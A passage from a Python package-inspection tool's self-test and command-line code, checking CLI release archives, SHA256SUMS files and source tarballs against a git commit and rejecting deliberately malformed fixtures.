                    host = judge(f"leak scan: {label}", [put(f"leak-{slug(label)}", f"{stem(gnu)}.tar.gz", planted)],
                                 FAIL, needle, options=options)
                finally:
                    for key, value in saved_env.items():
                        os.environ.pop(key) if value is None else os.environ.__setitem__(key, value)
                said = markdown(host, "leak scan") + json.dumps([dataclasses.asdict(a) for a in host.artifacts])
                if marker in said.lower():
                    failures.append(f"CLI leak scan: {label}: the --forbid value reached the report")

            # S1-S3: SHA256SUMS lists exactly the files given beside it, in sha256sum's format.
            one, two = archives[gnu], archives[mac]
            lines = {path.name: f"{sha256(path.read_bytes())}  {path.name}\n" for path in (one, two)}
            good = "".join(lines[name] for name in sorted(lines))
            for label, given, text, needle, options in (
                    ("CRLF line ends", [one, two], good.replace("\n", "\r\n"), "a CR byte", ()),
                    ("lines out of order", [one, two], "".join(lines[n] for n in sorted(lines, reverse=True)),
                     f"{one.name} before {two.name}", ()),
                    ("a wrong sha256", [one], f"{'0' * 64}  {one.name}\n", f"{one.name}: listed {'0' * 16}…", ()),
                    ("a line missing", [one, two], lines[one.name], f"no line for {two.name}", ()),
                    ("a line for a file not given", [one], good, f"a line for {two.name}, which was not given", ()),
                    ("a line for itself", [one], lines[one.name] + f"{'1' * 64}  {CLI_PACKAGE}-{version}-SHA256SUMS\n",
                     f"a line for {CLI_PACKAGE}-{version}-SHA256SUMS, which was not given", ()),
                    ("an upper-case sha256", [one], lines[one.name].upper().replace(one.name.upper(), one.name),
                     "line 1 is not", ()),
                    ("a binary-mode marker", [one], lines[one.name].replace("  ", " *"), "line 1 is not", ()),
                    ("a path in a name", [one], lines[one.name].replace("  ", "  release/"), "line 1 is not", ()),
                    ("no final newline", [one], lines[one.name].rstrip("\n"), "no final newline", ()),
                    ("a line twice", [one], lines[one.name] * 2, f"{one.name} listed twice", ()),
                    ("a non-ASCII byte", [one], lines[one.name] + "é\n", "a non-ASCII byte", ()),
                    ("no line at all", [], "", "no line", ()),
                    ("a sha256 other than --sums-sha256", [one, two], good, "its sha256 = --sums-sha256",
                     ("--sums-sha256", "f" * 64))):
                listing = put(f"sums-{slug(label)}", f"{CLI_PACKAGE}-{version}-SHA256SUMS", text.encode())
                judge(f"SHA256SUMS with {label}", [*given, listing], FAIL, needle, options=options)
            judge("SHA256SUMS named for another version", [one, put("sums-version", f"{CLI_PACKAGE}-0.10.0-SHA256SUMS",
                                                                  lines[one.name].encode())], FAIL,
                  f"name is {CLI_PACKAGE}-{version}-SHA256SUMS")

            # C10: the source archive is the commit's tree, file for file, under one prefix.
            prefix = f"{CLI_PACKAGE}-{version}-source/"

            def retar(edit=None, comment=commit, header: bytes = GZIP_HEADER) -> bytes:
                with tarfile.open(fileobj=io.BytesIO(git_tar)) as src:
                    members = [(m, src.extractfile(m).read() if m.isfile() else b"") for m in src.getmembers()]
                if edit is not None:
                    members = edit(members)
                return _gzip(_ustar(members, tarfile.PAX_FORMAT, {"comment": comment} if comment else None), 0, header)

            def changed(name: str, data: bytes = None, **fields):
                def edit(members):
                    for info, _ in members:
                        if info.name == prefix + name:
                            for key, value in fields.items():
                                setattr(info, key, value)
                    return [(info, data if data is not None and info.name == prefix + name else body)
                            for info, body in members]
                return edit

            def extra_member(kind=tarfile.REGTYPE):
                def edit(members):
                    info = tarfile.TarInfo(prefix + "extra.txt")
                    info.type, info.size, info.linkname = kind, 2 if kind == tarfile.REGTYPE else 0, "README.md"
                    return members + [(info, b"x\n" if kind == tarfile.REGTYPE else b"")]
                return edit

            with tarfile.open(fileobj=io.BytesIO(git_tar)) as src:
                executable = next(m.name for m in src.getmembers() if m.isfile() and m.mode & 0o111)
            altered = (ROOT / "LICENSING.md").read_bytes() + b"\nedited\n"
            for label, data, needle, at, src_tree in (
                    ("an extra file", retar(extra_member()), f"unexpected: {prefix}extra.txt", None, None),
                    ("a symlink", retar(extra_member(tarfile.SYMTYPE)), "extra.txt (symlink)", None, None),
                    ("a missing file", retar(lambda m: [r for r in m if r[0].name != prefix + "README.md"]),
                     f"missing: {prefix}README.md", None, None),
                    ("an altered file", retar(changed("LICENSING.md", size=len(altered), data=altered)),
                     f"differ: {prefix}LICENSING.md", None, None),
                    ("an exec bit added", retar(changed("README.md", mode=0o775)),
                     f"{prefix}README.md (tree 100644, member 775)", None, None),
                    ("an exec bit removed", retar(changed(executable.removeprefix(prefix), mode=0o664)),
                     f"{executable} (tree 100755, member 664)", None, None),
                    ("another commit's comment", retar(comment="0" * 40), "comment '" + "0" * 40, None, None),
                    ("no pax global header", retar(comment=None), "pax global header [], comment None", None, None),
                    ("another prefix", retar(lambda m: [(setattr(i, "name", i.name.replace(
                        prefix, "scanner/", 1)) or i, d) for i, d in m]), "file set is exactly the commit's tree",
                     None, None),
                    ("a gzip file name", retar(header=GZIP_HEADER[:3] + b"\x08" + GZIP_HEADER[4:] + b"src.tar\0"),
                     "gzip FNAME set", None, None),
                    ("a --commit that is not --source-tree's HEAD", source.read_bytes(),
                     "--source-tree's HEAD^{commit} = --commit: HEAD^{commit} '", "f" * 40, None),
                    ("a --source-tree that is no git checkout", source.read_bytes(), "has no HEAD commit", None,
                     str(base))):
                path = put(f"source-{slug(label)}", source.name, data)
                judge(f"source archive with {label}", [path], FAIL, needle, at=at,
                      options=("--source-tree", src_tree or str(ROOT)))
                path.unlink()
            judge("source archive named for another version", [put("source-version", f"{CLI_PACKAGE}-0.10.0-source"
                                                                  ".tar.gz", source.read_bytes())], FAIL,
                  f"name is {CLI_PACKAGE}-{version}-source.tar.gz", options=tree)
            # What git says about a tree this checkout does not have: symlinks, submodules, export attributes.
            oid = "1" * 40
            listing = "".join(f"{row}\x00" for row in (
                f"100644 blob {oid}\tREADME.md", f"100755 blob {oid}\tscripts/run.sh", f"040000 tree {oid}\tdocs",
                f"120000 blob {oid}\tlink", f"160000 commit {oid}\tvendor/sub")).encode()
            attributes = (b"README.md\0export-ignore\0unspecified\0README.md\0export-subst\0set\0"
                          b"docs\0export-ignore\0set\0scripts/run.sh\0export-subst\0unset\0")
            for label, got, want in (
                    ("ls-tree rows", parse_ls_tree(listing)[1], ("100755", "blob", oid, "scripts/run.sh")),
                    ("check-attr rows", parse_check_attr(attributes)["README.md"],
                     {"export-ignore": "unspecified", "export-subst": "set"}),
                    ("a tree git archive cannot map one to one", source_tree_problems(
                        parse_ls_tree(listing), parse_check_attr(attributes)),
                     ["link: a symlink", "vendor/sub: a submodule", "README.md: export-subst set",
                      "docs: export-ignore set"]),
                    ("a clean tree", source_tree_problems(parse_ls_tree(listing)[:3], {}), [])):
                count += 1
                if got != want:
                    failures.append(f"CLI {label}: {got!r} (want {want!r})")

            # The release set is complete, from one build, and holds nothing else.
            def release_set(label: str, files: list, *needles: str) -> None:
                judge(f"release set: {label}", [*files, sums(f"set-{slug(label)}", [
                    f for f in files if not f.name.endswith(".crate")])], FAIL, *needles,
                      options=("--release-set", *tree))

            others = {triple: put(f"other-notice-{triple}", f"{stem(triple)}.{ext}", archive_bytes(
                triple, inner(triple, std_notice=notice + b"<!-- another toolchain -->\n")))
                for triple, ext in CLI_TARGETS.items() if triple == mac}
            release_set("four archives", [a for t, a in archives.items() if t != mac] + [source],
                        f"no {mac} archive")
            release_set("a target twice", [*release, put("twice", archives[gnu].name, archives[gnu].read_bytes())],
                        f"2 {gnu} archives")
            release_set("two versions", [*release, put("old", f"{CLI_PACKAGE}-0.10.0-{gnu}.tar.gz", clean_gnu)],
                        f"versions 0.10.0, {version}")
            release_set("differing std notices", [*(a for t, a in archives.items() if t != mac), others[mac], source],
                        "2 std notices across the archives")
            release_set("no source archive", list(archives.values()), "no source archive")
            judge("release set: no SHA256SUMS", release, FAIL, "no SHA256SUMS", options=("--release-set", *tree))
            crate = _tar(put("crate", "placeholder", b"").with_name(f"qrcode-barcode-scanner-{version}.crate"),
                         f"qrcode-barcode-scanner-{version}", _clean_crate(version))
            release_set("a crate beside the CLI files", [*release, crate], "is not a CLI release asset")
            wheel = _zip(put("wheel", "placeholder", b"").with_name(
                f"{PY_MODULE}-{version}-cp38-abi3-manylinux_2_17_x86_64.whl"), _clean_wheel(version))
            judge("release set: a wheel beside the CLI files", [*full, wheel], FAIL,
                  f"wheel {wheel.name} is not a CLI release asset", options=("--release-set", *tree))

            # Usage: CLI files need a full --commit, the source archive a --source-tree; CLI options need CLI files.
            for label, argv in (
                    ("a CLI archive without --commit", ["archive", str(one)]),
                    ("a short commit", ["archive", str(one), "--commit", commit[:12]]),
                    ("an upper-case commit", ["archive", str(one), "--commit", commit.upper()]),
                    ("the source archive without --source-tree", ["archive", str(source), "--commit", commit]),
                    ("--sums-sha256 without SHA256SUMS", ["archive", str(one), "--commit", commit,
                                                          "--sums-sha256", "0" * 64]),
                    ("--sums-sha256 that is not a sha256", ["archive", str(one), str(checksums), "--commit", commit,
                                                            "--sums-sha256", "xyz"]),
                    ("--commit with no CLI file", ["archive", str(crate), "--commit", commit]),
                    ("an empty --forbid", ["archive", str(one), "--commit", commit, "--forbid", ""]),
                    ("a blank --forbid", ["archive", str(one), "--commit", commit, "--forbid", "  "]),
                    ("--commit with versions", ["versions", "--commit", commit]),
                    ("--forbid with selftest", ["selftest", "--forbid", "x"])):
                count += 1
                code = _run_main(argv)
                if code != 2:
                    failures.append(f"CLI usage, {label}: exit {code} (want 2)")

            # --record: once nothing failed, one sha256sum line per file given, SHA256SUMS included.
            for label, files, options, want in (
                    ("the clean release set", full, ("--release-set", "--tag", tag, "--sums-sha256", qualified), 0),
                    ("a SHA256SUMS other than --sums-sha256", full, ("--release-set", "--sums-sha256", "e" * 64), 1)):
                count += 1
                record = base / "records" / slug(label) / "cli-inspected.sha256"
                record.parent.mkdir(parents=True, exist_ok=True)
                record.write_text(f"{'0' * 64}  stale\n")
                code = _run_main(["archive", *map(str, files), "--commit", commit, *tree, *options, "--strict",
                                  "--quiet", "--record", str(record)])
                want_text = "".join(f"{sha256(p.read_bytes())}  {p}\n" for p in files) if want == 0 else None
                got = record.read_text() if record.exists() else None
                if code != want or got != want_text:
                    failures.append(f"CLI --record after {label}: exit {code} (want {want}), record {got!r:.90}")
        finally:
            CLI_COPIES["README.md"] = saved
    return count, failures


# ---------------------------------------------------------------- report


def git_head() -> str:
    proc = subprocess.run(["git", "rev-parse", "--short=12", "HEAD"], cwd=ROOT, capture_output=True, text=True)
    dirty = subprocess.run(["git", "status", "--porcelain"], cwd=ROOT, capture_output=True, text=True)
    return proc.stdout.strip() + (" (dirty)" if dirty.stdout.strip() else "")


def markdown(host: Host, title: str) -> str:
    lines = [f"## package-inspect · {title}", "",
             f"HEAD {git_head()} · workspace {host.version} · "
             f"{datetime.datetime.now(datetime.timezone.utc):%Y-%m-%d %H:%M} UTC", "",
             "| artifact | verdict | archive | sha256 | files |", "|---|---|---|---|---|"]
    for art in host.artifacts:
        lines.append(f"| {art.name} | **{art.status.upper()}** | {art.path or '—'} | "
                     f"{art.sha256[:16] or '—'} | {len(art.listing) or '—'} |")
    for art in host.artifacts:
        lines += ["", f"### {art.name} — {art.status.upper()}", ""]
        if art.reason:
            lines += [f"> {art.status.upper()}: {art.reason}", ""]
        lines += [f"- {note}" for note in art.notes]
        if art.checks:
            lines += ["", "| check | result | detail |", "|---|---|---|"]
            lines += [f"| {c.name} | {'ok' if c.ok else '**FAIL**'} | {c.detail.replace('|', '/')} |"
                      for c in art.checks]
        if art.listing:
            lines += ["", f"<details><summary>{len(art.listing)} entries</summary>", "", "```",
                      *art.listing, "```", "", "</details>"]
    return "\n".join(lines) + "\n"


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__.split("\n\n")[0])
    parser.add_argument("target", choices=["all", "crates", "node", "wasm", "python", "flutter",
                                           "archive", "pypi-live", "licenses", "profiles", "versions", "selftest"])
    parser.add_argument("files", nargs="*", help="archive: files to inspect (packages, or CLI release files) · "
                                                 "pypi-live: wheels and sdist to compare")
    parser.add_argument("--out", help="write package-inspect.{json,md} + logs/ here")
    parser.add_argument("--strict", action="store_true", help="UNAVAILABLE fails too")
    parser.add_argument("--quiet", action="store_true", help="stdout: the verdict table and failed checks only")
    parser.add_argument("--cargo-wrapper", help="run cargo as `WRAPPER cargo ...`")
    parser.add_argument("--allow-dirty", action="store_true", help="pass --allow-dirty to cargo package")
    parser.add_argument("--verify", action="store_true", help="crates: build each crate from its archive")
    parser.add_argument("--no-build", action="store_true", help="wasm: inspect the existing pkg/")
    parser.add_argument("--platform-dirs", help="node: a dir of napi platform packages (npm/)")
    parser.add_argument("--flutter", help="flutter: the flutter (or dart) binary")
    parser.add_argument("--package-root", help="flutter: inspect this staged package root, not the in-tree binding")
    parser.add_argument("--sync", action="store_true", help="licenses: rewrite stale copies")
    parser.add_argument("--nightly", help="profiles: the nightly toolchain for --unit-graph")
    parser.add_argument("--tag", help="versions: the release tag (vX.Y.Z or refs/tags/vX.Y.Z) · archive: the tag the "
                                      "CLI release files were built from")
    parser.add_argument("--record", help="archive · flutter: once nothing failed, write `<sha256>  <file>` per inspected file "
                                         "(sha256sum's format) to this file; removed when anything failed")
    parser.add_argument("--release-set", action="store_true",
                        help="node · archive: the set about to publish, complete and nothing else — npm: the main "
                             "package pins every napi target at this version and every pin has its platform "
                             "package; Python: one wheel per row of python.yml's matrix and one sdist; CLI: the "
                             "five archives, the source archive and SHA256SUMS. flutter: the "
                             "complete portable candidate and real pub validator (required in every Flutter inspection), "
                             f"and with --release-set the pubspec name {FLUTTER_NAME} and a README that states no "
                             "availability")
    parser.add_argument("--commit", help="archive: the full commit id the CLI release files were built from "
                                         "(required with them)")
    parser.add_argument("--sums-sha256", help="archive: the sha256 the CLI SHA256SUMS file must have")
    parser.add_argument("--source-tree", help="archive: a git checkout holding --commit (required with the CLI "
                                              "source archive)")
    parser.add_argument("--forbid", action="append", metavar="S",
                        help="archive: a string no CLI text member may hold (repeatable; never echoed)")
    return parser


def main(argv=None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    if args.record and args.target not in ("archive", "flutter"):
        parser.error("--record goes with archive or flutter")
    cli_options = [flag for flag, value in (("--commit", args.commit), ("--sums-sha256", args.sums_sha256),
                                            ("--source-tree", args.source_tree), ("--forbid", args.forbid))
                   if value is not None]
    if cli_options and args.target != "archive":
        parser.error(f"{', '.join(cli_options)}: archive only (CLI release files)")
    if args.target == "selftest":
        return self_test()

    host = Host(args)
    try:
        {
            "all": cmd_all, "crates": cmd_crates, "node": cmd_node, "wasm": cmd_wasm,
            "python": cmd_python, "flutter": cmd_flutter, "archive": cmd_archive, "pypi-live": cmd_pypi_live,
            "licenses": cmd_licenses, "profiles": cmd_profiles, "versions": cmd_versions,
        }[args.target](host)
    finally:
        shutil.rmtree(host.scratch, ignore_errors=True)

    report = markdown(host, args.target)
    # Persist the evidence before presentation, including a failing verdict.
    if host.out:
        (host.out / "package-inspect.md").write_text(report, encoding="utf-8")
        (host.out / "package-inspect.json").write_text(json.dumps(
            [dataclasses.asdict(a) | {"status": a.status} for a in host.artifacts], indent=2) + "\n", encoding="utf-8")
    summary = os.environ.get("GITHUB_STEP_SUMMARY")
    if summary:
        with open(summary, "a", encoding="utf-8") as sink:
            sink.write(report)
    failing = {FAIL} | ({UNAVAILABLE} if args.strict else set())
    bad = [a for a in host.artifacts if a.status in failing]
    if args.record:
        # What this run judged, path as given and sha256: a later step proves
        # it holds those very bytes. Nothing to prove when anything failed.
        record = pathlib.Path(args.record)
        if bad or any(art.status != PASS for art in host.artifacts):
            record.unlink(missing_ok=True)
        else:
            record.write_text("".join(f"{digest}  {name}\n" for digest, name in host.recorded), encoding="utf-8")
    if args.quiet:
        print("\n".join(line for line in report.splitlines()[:6 + len(host.artifacts)] if line.startswith("|")))
        for art in host.artifacts:
            failed = [c for c in art.checks if not c.ok]
            if failed or art.reason:
                print(f"{art.name} — {art.status.upper()}{': ' + art.reason if art.reason else ''}")
                print("\n".join(f"  ✗ {c.name}: {c.detail}" for c in failed))
    else:
        print(report)
    annotate = "::error title=package-inspect::" if os.environ.get("GITHUB_ACTIONS") else "package-inspect: "
    for art in bad:
        print(f"{annotate}{art.name}: {art.status.upper()} "
              f"{art.reason or '; '.join(c.name for c in art.checks if not c.ok)}", file=sys.stderr)
    return 1 if bad else 0


if __name__ == "__main__":
    for stream in (sys.stdout, sys.stderr):
        if hasattr(stream, "reconfigure"):
            stream.reconfigure(encoding="utf-8")
    sys.exit(main())
